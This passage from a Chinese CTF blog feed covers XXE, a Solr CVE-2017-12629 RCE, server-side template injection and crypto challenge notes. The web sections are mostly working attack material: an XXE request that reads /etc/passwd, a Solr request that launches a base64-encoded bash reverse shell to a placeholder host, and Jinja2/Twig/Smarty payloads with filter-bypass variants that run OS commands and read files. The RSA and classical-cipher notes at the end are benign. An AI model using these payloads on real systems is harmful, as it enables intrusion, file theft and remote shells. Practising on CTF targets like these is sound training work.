HTTP/1.1</span><br><span class="line">Host: node4.buuoj.cn:29652</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cache: no-cache</span><br><span class="line">Origin: moz-extension://7448e4bf-6a1b-41a0-ab99-80010feb71a6</span><br><span class="line">Content-Length: 199</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Solr-CVE-2017-12629-RCE"><a href="#Solr-CVE-2017-12629-RCE" class="headerlink" title="[Solr]CVE-2017-12629-RCE"></a>[Solr]CVE-2017-12629-RCE</h2><p>仅贴利用报文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: node4.buuoj.cn:25528</span><br><span class="line">Content-Length: 239</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;add-listener&quot;:&#123;</span><br><span class="line">    &quot;event&quot;:&quot;newSearcher&quot;,&quot;name&quot;:&quot;newSearcher1&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;echo BASE64SHELL|base64 -d|bash -i&quot;]&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中BASE64SHELL为下列语句的base64加密<br><code>bash -i &gt;&amp; /dev/tcp/your-ip/your-port 0&gt;&amp;1</code></p><p>这里换成其他的反弹shell都可以，但要注意base64编码 </p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.freebuf.com/articles/network/181064.html">XXE(XML External Entity attack)XML外部实体注入攻击</a><br><a href="https://zhuanlan.zhihu.com/p/191346829">反弹shell的各种姿势</a><br><a href="https://www.whcsrl.com/blog/10541">Apache Solr 远程命令执行漏洞（CVE-2017-12629）</a><br><a href="https://green-m.me/2019/11/06/encrypt-reverse-shell/#0x03-base64base32hex-%E7%BC%96%E7%A0%81%E7%9A%84%E5%8F%8D%E5%BC%B9shell">对基础 shell 进行流量混淆</a><br><a href="https://forum.ywhack.com/reverse-shell/">反弹Shell命令一键生成</a><br><a href="http://www.hackdig.com/08/hack-446221.htm">反弹Shell命令一键生成汇总</a><br><a href="https://chowdera.com/2022/02/202202191957090774.html#_49">CVE-2017-12629）Apache Solr RCE命令执行漏洞复现</a><br><a href="https://github.com/vulhub/vulhub/blob/master/solr/CVE-2017-12629-RCE/README.md">vulhub  Apache Solr 远程命令执行漏洞（CVE-2017-12629）</a><br><a href="https://www.freebuf.com/articles/web/177979.html">XXE漏洞利用技巧：从XML到远程代码执行</a><br><a href="https://www.anquanke.com/post/id/151944">从XML到RCE（远程代码执行）</a><br><a href="https://blog.csdn.net/qq_36241198/article/details/114778393">buuctf [PHP]XXE</a><br><a href="https://www.freebuf.com/vuls/175451.html">浅谈XML实体注入漏洞</a>  </p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初探服务端模板注入-以ctf题目为例</title>
      <link href="/2022/04/13/%E5%88%9D%E6%8E%A2%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E4%BB%A5ctf%E9%A2%98%E7%9B%AE%E4%B8%BA%E4%BE%8B/"/>
      <url>/2022/04/13/%E5%88%9D%E6%8E%A2%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E4%BB%A5ctf%E9%A2%98%E7%9B%AE%E4%B8%BA%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是服务端模板？"><a href="#什么是服务端模板？" class="headerlink" title="什么是服务端模板？"></a>什么是服务端模板？</h2><p>模板引擎用于使用动态数据呈现内容。</p><p>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。</p><p>说人话，就是，重复的事情交给模板，我们只需要关注动态内容，和业务逻辑。运行根本逻辑同格式化字符串。</p><h2 id="为什么会造成注入？"><a href="#为什么会造成注入？" class="headerlink" title="为什么会造成注入？"></a>为什么会造成注入？</h2><p>SSTI （服务器端模板注入）如果攻击者能够控制要呈现的模板，服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，就可能导致上下文数据的暴露，甚至在服务器上运行任意命令的表达式。</p><p>讲人话，既然逻辑类似于格式化字符串，那么其存在的漏洞也类似于格式化字符串，即插入的动态数据有可能改变源代码的功能，造成注入。</p><h2 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h2><ol><li>确定使用的引擎</li><li>查看引擎相关的文档，确定其安全机制以及自带的函数和变量</li><li>需找攻击面，尝试攻击<h2 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h2></li></ol><ul><li>简单的数学表达式，14 &#x3D;&gt; 14</li><li>字符串表达式 ajin &#x3D;&gt; ajin</li><li>Ruby <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= 7 * 7 %&gt;</span><br><span class="line">&lt;%= File.open(&#x27;/etc/passwd&#x27;).read %&gt;</span><br></pre></td></tr></table></figure></li><li>Java<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;7*7&#125;</span><br></pre></td></tr></table></figure></li><li>Twig<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure></li><li>Smarty<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;php&#125;echo `id`;&#123;/php&#125;</span><br></pre></td></tr></table></figure></li><li>AngularJS<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$eval(&#x27;1+1&#x27;)</span><br></pre></td></tr></table></figure></li><li>Tornado<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">+ Flask/Jinja2</span><br><span class="line">```python</span><br><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;config.items()&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()&#125;&#125;</span><br><span class="line">&#123;&#123; url_for.__globals__[&#x27;__builtins__&#x27;].__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;) &#125;&#125;</span><br><span class="line">&#123;&#123; request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure></li><li>Django<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; request &#125;&#125;</span><br><span class="line">&#123;% debug %&#125;</span><br><span class="line">&#123;% load module %&#125;</span><br><span class="line">&#123;% include <span class="string">&quot;x.html&quot;</span> %&#125;</span><br><span class="line">&#123;% extends <span class="string">&quot;x.html&quot;</span> %&#125;</span><br></pre></td></tr></table></figure></li></ul><p>判断模板导图</p><p><img src="/2022/04/13/%E5%88%9D%E6%8E%A2%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E4%BB%A5ctf%E9%A2%98%E7%9B%AE%E4%B8%BA%E4%BE%8B/2022-04-13-11-22-55.png"></p><h2 id="最终目标"><a href="#最终目标" class="headerlink" title="最终目标"></a>最终目标</h2><ul><li>创建对象</li><li>文件读写</li><li>远程文件包含</li><li>信息泄漏</li><li>提权</li></ul><h2 id="常用属性"><a href="#常用属性" class="headerlink" title="常用属性"></a>常用属性</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line"></span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line"></span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line"></span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line"></span><br><span class="line">__init__  类的初始化方法</span><br><span class="line"></span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure><h2 id="常见Payload"><a href="#常见Payload" class="headerlink" title="常见Payload"></a>常见Payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flask </span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span> )</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()<span class="comment">#__subclasses__()[127]为os._wrap_close</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()<span class="comment">#__subclasses__()[128]为_sitebuiltins.Quitter&#x27; 经测试，改为[129]也可以 即&#x27;_sitebuiltins._Printer</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)<span class="comment">#__subclasses__()[71] 为&lt;class &#x27;site._Printer&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].listdir(<span class="string">&#x27;.&#x27;</span>)&#125;&#125;<span class="comment">#__subclasses__()[71]为site._Printer，可以查看当前文件目录</span></span><br><span class="line">&#123;&#123;().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;fl4g&#x27;</span>).read()&#125;&#125; <span class="comment">#__subclasses__()[40]为file，即file(&#x27;fl4g&#x27;).read()</span></span><br><span class="line"></span><br><span class="line">twig</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;id&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><h3 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">request[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__base__.__base__.__base__[&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[60]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="使用参数绕过"><a href="#使用参数绕过" class="headerlink" title="使用参数绕过"></a>使用参数绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">params = &#123;</span><br><span class="line">    &#x27;clas&#x27;: &#x27;__class__&#x27;,</span><br><span class="line">    &#x27;mr&#x27;: &#x27;__mro__&#x27;,</span><br><span class="line">    &#x27;subc&#x27;: &#x27;__subclasses__&#x27;</span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;data&quot;: &quot;&#123;&#123;&#x27;&#x27;[request.args.clas][request.args.mr][1][request.args.subc]()&#125;&#125;&quot;</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url, params=params, data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h3 id="16进制绕过"><a href="#16进制绕过" class="headerlink" title="16进制绕过"></a>16进制绕过</h3><p>以[BUUCTF][pasecactf_2019]flask_ssti 1为 例，<code>. _ &#39; </code>被禁止</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">单引号&#x27;被过滤可以用双引号&quot;代替；至于点.和下划线_被过滤可以采用16进制来表示，用[](类似数组下标)的方式选定。知道怎么过滤了那就照着以前payload修改就好了。</span><br><span class="line"></span><br><span class="line">实际</span><br><span class="line">payload:</span><br><span class="line">&#123;&#123;config[&quot;__class__&quot;][&quot;__init__&quot;][&quot;__globals__&quot;][&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;)[&quot;read&quot;]()&#125;&#125;</span><br><span class="line">编码后</span><br><span class="line">payload：&#123;&#123;config[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;)[&quot;read&quot;]()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="实践，以ctf题目为例"><a href="#实践，以ctf题目为例" class="headerlink" title="实践，以ctf题目为例"></a>实践，以ctf题目为例</h2><p>BUUCTF [第三章 web进阶]SSTI<br>测试<br><code>http://fe0e3bb8-ec46-4eae-b8c3-100e1cec80fb.node4.buuoj.cn:81/?password=&#123;&#123;7*'7'&#125;&#125;</code></p><p>判断为jinjia2</p><p>进行下一步利用</p><ol><li><p>获取字符串的类对象<br><code>&#123;&#123;''__class__&#125;&#125;</code></p><p>回显 <code>&lt;class &#39;str&#39;&gt;</code></p></li><li><p>寻找基类<br>  <code>&#123;&#123;''.__class__.__mro__&#125;&#125;</code><br>  回显  <code>(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)</code></p></li><li><p>定位object,<br><code>&#123;&#123;''.__class__.__mro__[1]&#125;&#125;</code><br>回显 <code>&lt;class &#39;object&#39;&gt;</code></p></li><li><p>寻找可用引用<br><code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()&#125;&#125;</code><br>回显 <code>[&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;N …………（太多了，只展示部分）</code></p></li><li><p>查找os可用类，这里使用os._wrap_close<br>模糊定位脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">buff=<span class="string">&quot;回显的很多class&quot;</span></span><br><span class="line">split_key=<span class="built_in">input</span>(<span class="string">&#x27;you split key&#x27;</span>)</span><br><span class="line">a=buff.split(split_key)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">in</span> a[i] :</span><br><span class="line">        <span class="built_in">print</span>(i,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(a[i])</span><br></pre></td></tr></table></figure></li><li><p>构造利用语句<br><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['popen']('cat /app/server.py').read()&#125;&#125;</code></p></li></ol><p>其中<br>   os.popen() 方法用于从一个命令打开一个管道。<br>   在Unix，Windows中有效<br>popen()方法语法格式如下：<br><code>os.popen(command[, mode[, bufsize]])</code></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/articles/web/246832.html">细说服务器端模板注入（SSTI）</a><br><a href="https://websec.readthedocs.io/zh/latest/vuln/ssti.html#">模版注入</a><br><a href="https://www.freebuf.com/column/187845.html">从零学习flask模板注入</a><br><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#1-PHP-%E5%AE%9E%E4%BE%8B">一篇文章带你理解漏洞之 SSTI 漏洞</a><br><a href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门</a><br><a href="https://vulwiki.readthedocs.io/zh_CN/latest/web/ssti/">SSTI</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-Crypto-刷题笔记-01</title>
      <link href="/2022/03/29/BUUCTF-Crypto-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-01/"/>
      <url>/2022/03/29/BUUCTF-Crypto-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-01/</url>
      
        <content type="html"><![CDATA[<h2 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h2><p>递增凯撒，每个字母偏移递增</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test_string0=<span class="string">&#x27;afZ_r9VYfScOeO_UL^RWUc&#x27;</span></span><br><span class="line">test_string1=<span class="string">&#x27;flag&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(test_string0)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(test_string0[i])+<span class="number">5</span>+i),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="Quoted-printable"><a href="#Quoted-printable" class="headerlink" title="Quoted-printable"></a>Quoted-printable</h2><p>Quoted-printable编码<br>在线连接<br><a href="http://www.mxcz.net/tools/quotedprintable.aspx">http://www.mxcz.net/tools/quotedprintable.aspx</a></p><h2 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit"></a>Rabbit</h2><p>rabbit编码<br>解码即可</p><h2 id="篱笆墙的影子"><a href="#篱笆墙的影子" class="headerlink" title="篱笆墙的影子"></a>篱笆墙的影子</h2><p>栅栏密码</p><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>rsa加密，根据此公式计算即可</p><p><img src="/2022/03/29/BUUCTF-Crypto-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-01/2022-03-29-21-45-59.png"></p><h2 id="丢失的MD5"><a href="#丢失的MD5" class="headerlink" title="丢失的MD5"></a>丢失的MD5</h2><p>不懂，python2运行即可</p><h2 id="Alice与Bob"><a href="#Alice与Bob" class="headerlink" title="Alice与Bob"></a>Alice与Bob</h2><p>在线质数分解，再32位MD5即可<br><a href="http://www.jsons.cn/quality/">http://www.jsons.cn/quality/</a></p><h2 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q = <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">fn = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, fn)</span><br><span class="line"></span><br><span class="line"><span class="comment"># encode</span></span><br><span class="line"><span class="comment"># plain = &quot;hello world&quot;</span></span><br><span class="line"><span class="comment"># c=83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line"><span class="comment"># cipher = gmpy2.powmod(int(plain.encode(&#x27;hex&#x27;), 16), e, n)</span></span><br><span class="line"><span class="comment"># print cipher</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># decode</span></span><br><span class="line">cipher = <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line">plaint = gmpy2.powmod(cipher, d, n)</span><br><span class="line"><span class="built_in">print</span>(plaint)</span><br><span class="line">s = <span class="string">&#x27;%x&#x27;</span> % plaint</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(s) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">    s = <span class="string">&#x27;0&#x27;</span> + s</span><br></pre></td></tr></table></figure><p>贴几个好用得网站</p><p><a href="https://zh.numberempire.com/">数字帝国</a>：可以分解质数<br><a href="https://www.wishingstarmoye.com/ctf/rsatool">许愿星</a>：rsa用它就够了，很全！</p><h2 id="大帝的密码武器"><a href="#大帝的密码武器" class="headerlink" title="大帝的密码武器"></a>大帝的密码武器</h2><p>rot13</p><h2 id="Windows系统密码"><a href="#Windows系统密码" class="headerlink" title="Windows系统密码"></a>Windows系统密码</h2><p>md5解密</p><h2 id="信息化时代的步伐"><a href="#信息化时代的步伐" class="headerlink" title="信息化时代的步伐"></a>信息化时代的步伐</h2><p>中文电码<br><a href="http://code.mcdvisa.com/">http://code.mcdvisa.com/</a></p><h2 id="传统知识-古典密码"><a href="#传统知识-古典密码" class="headerlink" title="传统知识+古典密码"></a>传统知识+古典密码</h2><p>脑洞<br><img src="/2022/03/29/BUUCTF-Crypto-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-01/2022-03-30-09-04-32.png"><br>对应得到数字再加60（一甲子），栅栏+凯撒<br>很全得CTF编码<br><a href="http://www.hiencode.com/">http://www.hiencode.com/</a></p><h2 id="凯撒？替换？呵呵"><a href="#凯撒？替换？呵呵" class="headerlink" title="凯撒？替换？呵呵!"></a>凯撒？替换？呵呵!</h2><p>替换<br><a href="https://quipqiup.com/">https://quipqiup.com/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Puzzle: </span><br><span class="line">MTHJCUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO</span><br><span class="line"> Clues: For example G=R QVW=THE</span><br><span class="line">MTHJ=flag</span><br></pre></td></tr></table></figure><h2 id="萌萌哒的八戒"><a href="#萌萌哒的八戒" class="headerlink" title="萌萌哒的八戒"></a>萌萌哒的八戒</h2><p>猪圈密码<br><a href="http://www.hiencode.com/pigpen.html">http://www.hiencode.com/pigpen.html</a></p><h2 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h2><p>中国剩余定理</p><p>参考：<br><a href="https://ljahum.gitee.io/2020/04/08/rsa1/">https://ljahum.gitee.io/2020/04/08/rsa1/</a><br><a href="https://blog.csdn.net/MikeCoke/article/details/105959599">https://blog.csdn.net/MikeCoke/article/details/105959599</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">q=<span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span></span><br><span class="line">p=<span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span></span><br><span class="line">dq=<span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span></span><br><span class="line">dp=<span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span></span><br><span class="line">c=<span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line">I = gmpy2.invert(q,p)</span><br><span class="line">mp = <span class="built_in">pow</span>(c,dp,p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c,dq,q)               <span class="comment">#求幂取模运算</span></span><br><span class="line"></span><br><span class="line">m = 